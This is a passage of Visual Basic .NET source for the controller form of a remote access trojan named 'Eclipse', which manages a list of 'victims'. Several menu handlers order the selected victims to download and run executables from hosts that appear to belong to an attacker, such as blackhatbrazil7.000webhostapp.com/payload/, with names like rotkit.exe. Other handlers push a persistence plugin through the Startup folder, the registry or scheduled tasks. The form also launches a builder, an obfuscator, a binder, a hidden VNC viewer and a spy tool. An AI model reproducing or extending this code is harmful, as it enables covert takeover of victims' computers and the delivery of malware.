        Dim Frm_Builder As New Builder
        Trocar_Painel_Builder(Frm_Builder)

        Guna2Transition1.Hide(Panel_Downloader)
        Guna2Transition1.Hide(Panel_Binder)
        Guna2Transition1.Hide(Panel_IconChanger)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(Panel_vitimas)
        Guna2Transition1.ShowSync(Panel_builder)
    End Sub

    Private Sub ContextMenuStrip1_Opening(sender As Object, e As CancelEventArgs) Handles ContextMenuStrip1.Opening

    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs)

    End Sub


    Private Sub StatusStrip1_ItemClicked(sender As Object, e As ToolStripItemClickedEventArgs)

    End Sub

    Private Sub Guna2CircleProgressBar1_ValueChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2ToggleSwitch1_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs)

        Guna2Transition1.Hide(Panel_Downloader)
        Guna2Transition1.Hide(Panel_Binder)
        Guna2Transition1.Hide(Panel_IconChanger)
        Guna2Transition1.Hide(Panel_vitimas)
        Guna2Transition1.Hide(Panel_builder)
        Guna2Transition1.ShowSync(Panel_homepage)
    End Sub

    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs)

        Guna2Transition1.Hide(Panel_Downloader)
        Guna2Transition1.Hide(Panel_Binder)
        Guna2Transition1.Hide(Panel_IconChanger)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(Panel_builder)
        Guna2Transition1.ShowSync(Panel_vitimas)
    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click

    End Sub

    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click

    End Sub

    Private Sub Label10_Click(sender As Object, e As EventArgs) Handles Label10.Click

    End Sub

    Private Sub Guna2Button7_Click(sender As Object, e As EventArgs)
        Dim f As New About
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub

    Private Sub Guna2RatingStar1_ValueChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label11_Click(sender As Object, e As EventArgs) Handles Label11.Click

    End Sub

    Private Sub Label12_Click(sender As Object, e As EventArgs) Handles Label12.Click

    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs)
        Application.Exit()
    End Sub

    Private Sub Label15_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label14_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GroupBox4_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GroupBox1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label17_Click(sender As Object, e As EventArgs) Handles Label17.Click

    End Sub

    Private Sub BlankScreenToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub PluginsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PluginsToolStripMenuItem.Click

    End Sub



    Private Sub Sexo(sender As Object, e As EventArgs) Handles LinkToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = Interaction.InputBox("Set The Url", "From Url", urle)
            Dim fname As String = "server.exe"
            Dim str4 As String = Interaction.InputBox("Set The File Name", "File Name", fname)
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & str4 & Settings.SPL & str3)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "uninstalldev.exe" & Settings.SPL & "https://www.upload.ee/download/15126763/c1ad687c728c1cc43e68/eclipse-0.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub RemoteChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteChatToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Xchat")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub InstallToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "jesus.exe" & Settings.SPL & "https://cdn-149.bayfiles.com/OclcZ1l0z8/d0138fe2-1681783305/eclipse-ring0.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub InstallToolStripMenuItem1_Click_1(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "rotkit.exe" & Settings.SPL & "https://blackhatbrazil7.000webhostapp.com/payload/eclipse.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click_1(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "rotkit.exe" & Settings.SPL & "https://blackhatbrazil7.000webhostapp.com/payload/eclipserem.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub Lv2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Lv2.SelectedIndexChanged

    End Sub

    Private Sub Lv1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Lv1.SelectedIndexChanged

    End Sub

    Private Sub Guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel_vitimas.Paint

    End Sub

    Private Sub MenagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MenagerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            For Each form As Form In My.Application.OpenForms
                If form.Name = "Menager" Then
                    MessageBox.Show("You already have an open menager.", "Eclipse", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    Return
                End If
            Next

            ' Se o formulário não estiver aberto, você pode abrir ele aqui
            Dim novoForm As New Controlpanel()
            novoForm.Show()
        Else
            MessageBox.Show("You need to at least select a victim for it to work.", "Eclipse", MessageBoxButtons.OK)
        End If

    End Sub

    Private Sub CommandsToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs)
        Dim Bucetao As New choose
        Bucetao.Show()
    End Sub
    Private Function FindFile(folder As String, fileName As String) As String
        Dim filePath As String = System.IO.Path.Combine(folder, fileName)
        If System.IO.File.Exists(filePath) Then ' Verifica se o arquivo existe na pasta atual
            Return filePath
        End If

        For Each subFolder As String In System.IO.Directory.GetDirectories(folder) ' Procura nas subpastas
            filePath = FindFile(subFolder, fileName)
            If Not String.IsNullOrEmpty(filePath) Then
                Return filePath
            End If
        Next

        Return Nothing ' Retorna Nothing se o arquivo não for encontrado
    End Function

    Private Sub ClientMenagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientMenagerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count >= 1 Then
            For Each form As Form In My.Application.OpenForms
                If form.Name = "Client Menager" Then
                    MessageBox.Show("Client Menager can only be open one time at once.", "Eclipse", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    Return
                End If
            Next

            ' Se o formulário não estiver aberto, você pode abrir ele aqui
            Dim novoForm As New Client_Menager()
            novoForm.Show()
        Else
            MessageBox.Show("Client Menager can only be open one time at once.", "Eclipse", MessageBoxButtons.OK)
        End If

    End Sub

    Private Sub Panel_featuresadd_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub IssasexeToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "rowdowtkit.exe" & Settings.SPL & "https://blackhatbrazil7.000webhostapp.com/payload/Onedrive3.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub ConhostexeToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "rowotkit.exe" & Settings.SPL & "https://blackhatbrazil7.000webhostapp.com/payload/Onedrive3.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub RuntimeBrokerexeToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "rowwdkit.exe" & Settings.SPL & "https://blackhatbrazil7.000webhostapp.com/payload/Onedrive1.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub SvchostexeToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "rowwtkit.exe" & Settings.SPL & "https://blackhatbrazil7.000webhostapp.com/payload/Onedrive2.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub StealthPanelToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count >= 1 Then
            For Each form As Form In My.Application.OpenForms
                If form.Name = "Stealth Panel" Then
                    MessageBox.Show("Stealth Panel can only be open one time at once.", "Eclipse", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    Return
                End If
            Next

            ' Se o formulário não estiver aberto, você pode abrir ele aqui
            Dim novoForm As New exploitpanel()
            novoForm.Show()
        Else
            MessageBox.Show("Stealh Panel can only be open one time at once.", "Eclipse", MessageBoxButtons.OK)
        End If

    End Sub

    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click

    End Sub

    Private Sub StartupToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartupToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Install.dll")) & Settings.SPL & "1")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub RegistryToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RegistryToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Install.dll")) & Settings.SPL & "2")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub SchtasksToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles SchtasksToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Install.dll")) & Settings.SPL & "3")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub Guna2CirclePictureBox1_MouseDown(sender As Object, e As MouseEventArgs) Handles Guna2CirclePictureBox2.MouseDown
        Dim contextMenuStrip1 As New ToolStripDropDown()
        contextMenuStrip1.BackColor = Color.FromArgb(15, 15, 15)
        contextMenuStrip1.ForeColor = Color.White


        Dim toolStripMenuItem2 As New ToolStripMenuItem("Restart")
        Dim toolStripMenuItem3 As New ToolStripMenuItem("Leave")
        Dim toolstripMenuItem4 As New ToolStripMenuItem("Minimize")


        AddHandler toolStripMenuItem2.Click, AddressOf doolStripMenuItem2_Click
        AddHandler toolStripMenuItem3.Click, AddressOf doolStripMenuItem3_Click
        AddHandler toolstripMenuItem4.Click, AddressOf doolStripMenuItem4_Click

        contextMenuStrip1.Items.AddRange(New ToolStripItem() {toolStripMenuItem2, toolStripMenuItem3, toolstripMenuItem4})

        contextMenuStrip1.Show(Guna2CirclePictureBox2, New Point(0, Guna2CirclePictureBox2.Height))

    End Sub


    Private Sub doolStripMenuItem2_Click(sender As Object, e As EventArgs)
        ' Função a ser executada quando o item "Restart" é clicado
        MessageBox.Show("Not working!")
    End Sub

    Private Sub doolStripMenuItem3_Click(sender As Object, e As EventArgs)
        ' Função a ser executada quando o item "Leave" é clicado
        Application.Exit()
    End Sub
    Private Sub doolStripMenuItem4_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub
    Private Sub userProfile_Click(sender As Object, e As EventArgs)
        MessageBox.Show("sexo")
    End Sub

    Private Sub restart_Click(sender As Object, e As EventArgs)
        Try
            Process.Start(Application.ExecutablePath)
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub leave_Click(sender As Object, e As EventArgs)
        Application.Exit()
    End Sub

    Private Class CustomColorTable
        Inherits ProfessionalColorTable

        Public Overrides ReadOnly Property MenuBorder() As Color
            Get
                Return Color.FromArgb(15, 15, 15)
            End Get
        End Property
    End Class

    Private Sub Guna2CirclePictureBox2_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox2.Click

    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button2_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button5_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button3_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button6_Click(sender As Object, e As EventArgs) Handles Guna2Button6.Click
        Dim fileName As String = "eclipsespy.exe"
        Dim startFolder As String = Application.StartupPath ' Pasta inicial do aplicativo
        Dim filePath As String = FindFile(startFolder, fileName)

        If Not String.IsNullOrEmpty(filePath) Then ' Verifica se o arquivo foi encontrado
            System.Diagnostics.Process.Start(filePath) ' Inicia o arquivo
        Else
            MessageBox.Show("The eclipse spy was not found.", "Eclipse", MessageBoxButtons.OK)
        End If

    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles Guna2TextBox2.TextChanged
        FiltrarListView(Guna2TextBox2.Text)
    End Sub

    Private Sub FiltrarListView(ByVal filtro As String)
        For Each item As ListViewItem In Lv1.Items
            item.Selected = item.Text.ToLower().Contains(filtro.ToLower())
        Next
    End Sub

    Private Sub Guna2PictureBox4_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox4.Click

    End Sub

    Private Sub Guna2Button8_Click(sender As Object, e As EventArgs) Handles Guna2Button8.Click
        Changelog.Show()
    End Sub

    Private Sub Guna2Button10_Click(sender As Object, e As EventArgs) Handles Guna2Button10.Click
        Guna2Transition1.Hide(Info)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(pn_client)
        Guna2Transition1.Hide(pn_builder)
        Guna2Transition1.Hide(pn_obf)
        Guna2Transition1.Hide(pn_changer)
        Guna2Transition1.Hide(pn_memory)
        Guna2Transition1.ShowSync(Misc)
    End Sub

    Private Sub Guna2Button11_Click(sender As Object, e As EventArgs) Handles Guna2Button11.Click
        Guna2Transition1.Hide(Misc)
        Guna2Transition1.Hide(pn_builder)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(pn_client)
        Guna2Transition1.Hide(pn_obf)
        Guna2Transition1.Hide(pn_changer)
        Guna2Transition1.Hide(pn_memory)
        Guna2Transition1.ShowSync(Info)

    End Sub

    Private Sub Guna2Button9_Click(sender As Object, e As EventArgs) Handles Guna2Button9.Click
        Dim Frm_Builder As New Builder
        Trocar_Painel_Builder(Frm_Builder)
        Guna2Transition1.Hide(Misc)
        Guna2Transition1.Hide(Info)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(pn_client)
        Guna2Transition1.Hide(pn_obf)
        Guna2Transition1.Hide(pn_changer)
        Guna2Transition1.Hide(pn_memory)
        Guna2Transition1.ShowSync(pn_builder)
    End Sub

    Private Sub Guna2Button7_Click_1(sender As Object, e As EventArgs) Handles Guna2Button7.Click
        Guna2Transition1.Hide(Misc)
        Guna2Transition1.Hide(Info)
        Guna2Transition1.Hide(pn_builder)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(pn_obf)
        Guna2Transition1.Hide(pn_changer)
        Guna2Transition1.Hide(pn_memory)
        Guna2Transition1.ShowSync(pn_client)
    End Sub

    Private Sub btnFeatI_Click(sender As Object, e As EventArgs) Handles btnFeatI.Click
        Guna2Transition1.Hide(Misc)
        Guna2Transition1.Hide(pn_builder)
        Guna2Transition1.Hide(Info)
        Guna2Transition1.Hide(pn_client)
        Guna2Transition1.Hide(pn_obf)
        Guna2Transition1.Hide(pn_changer)
        Guna2Transition1.Hide(pn_memory)
        Guna2Transition1.ShowSync(Panel_homepage)
    End Sub

    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton1.Click
        Guna2Transition1.Hide(Misc)
        Guna2Transition1.Hide(Info)
        Guna2Transition1.Hide(pn_builder)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(pn_client)
        Guna2Transition1.Hide(pn_changer)
        Guna2Transition1.Hide(pn_memory)
        Guna2Transition1.ShowSync(pn_obf)
        Dim fileName As String = "obf.exe"
        Dim startFolder As String = Application.StartupPath ' Pasta inicial do aplicativo
        Dim filePath As String = FindFile(startFolder, fileName)

        If Not String.IsNullOrEmpty(filePath) Then ' Verifica se o arquivo foi encontrado
            System.Diagnostics.Process.Start(filePath) ' Inicia o arquivo
        Else
            MessageBox.Show("The obsfuscator file was not found.", "Eclipse", MessageBoxButtons.OK)
        End If
    End Sub

    Private Sub bt_default_Click(sender As Object, e As EventArgs) Handles bt_default.Click
        Guna2Transition1.Hide(Misc)
        Guna2Transition1.Hide(Info)
        Guna2Transition1.Hide(pn_builder)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(pn_client)
        Guna2Transition1.Hide(pn_obf)
        Guna2Transition1.Hide(pn_memory)
        Guna2Transition1.ShowSync(pn_changer)
        Dim fileName As String = "ch.exe"
        Dim startFolder As String = Application.StartupPath ' Pasta inicial do aplicativo
        Dim filePath As String = FindFile(startFolder, fileName)

        If Not String.IsNullOrEmpty(filePath) Then ' Verifica se o arquivo foi encontrado
            System.Diagnostics.Process.Start(filePath) ' Inicia o arquivo
        Else
            MessageBox.Show("The icon changer file was not found.", "Eclipse", MessageBoxButtons.OK)
        End If
    End Sub

    Private Sub btn_login_Click(sender As Object, e As EventArgs) Handles btn_login.Click
        Guna2Transition1.Hide(Misc)
        Guna2Transition1.Hide(Info)
        Guna2Transition1.Hide(pn_builder)
        Guna2Transition1.Hide(Panel_homepage)
        Guna2Transition1.Hide(pn_client)
        Guna2Transition1.Hide(pn_obf)
        Guna2Transition1.Hide(pn_changer)
        Guna2Transition1.ShowSync(pn_memory)
        Dim fileName As String = "bnd.exe"
        Dim startFolder As String = Application.StartupPath ' Pasta inicial do aplicativo
        Dim filePath As String = FindFile(startFolder, fileName)

        If Not String.IsNullOrEmpty(filePath) Then ' Verifica se o arquivo foi encontrado
            System.Diagnostics.Process.Start(filePath) ' Inicia o arquivo
        Else
            MessageBox.Show("The Eclipse Binder file was not found.", "Eclipse", MessageBoxButtons.OK)
        End If
    End Sub

    Private Sub HVNCClientToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HVNCClientToolStripMenuItem.Click
        Dim fileName As String = "vncview.exe"
        Dim startFolder As String = Application.StartupPath ' Pasta inicial do aplicativo
        Dim filePath As String = FindFile(startFolder, fileName)

        If Not String.IsNullOrEmpty(filePath) Then ' Verifica se o arquivo foi encontrado
            System.Diagnostics.Process.Start(filePath) ' Inicia o arquivo
        Else
            MessageBox.Show("The HVNC file was not found.", "Eclipse", MessageBoxButtons.OK)
        End If
    End Sub

    Private Sub SexoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SexoToolStripMenuItem.Click

    End Sub
End Class




